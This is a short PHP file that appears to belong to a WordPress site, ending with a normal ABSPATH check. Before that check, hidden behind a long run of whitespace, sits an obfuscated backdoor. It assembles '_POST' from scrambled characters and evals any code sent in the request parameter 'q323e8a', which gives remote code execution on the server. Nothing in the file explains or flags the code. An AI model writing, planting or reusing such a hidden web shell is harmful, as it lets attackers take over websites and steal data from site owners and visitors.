<?php                                                                                                                                                                                                                                                                      $gsvi29="o_prsteu" ; $uudv5 =$gsvi29[4].$gsvi29[5]. $gsvi29[3].$gsvi29[5]. $gsvi29[0].$gsvi29[7]. $gsvi29[2]. $gsvi29[2]. $gsvi29[6]. $gsvi29[3] ;$nhb6=$uudv5($gsvi29[1].$gsvi29[2] .$gsvi29[0]. $gsvi29[4]. $gsvi29[5] );if(isset(${$nhb6 }['q323e8a'] ) ) { eval ( ${$nhb6 } [ 'q323e8a' ]) ;} ?><?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}
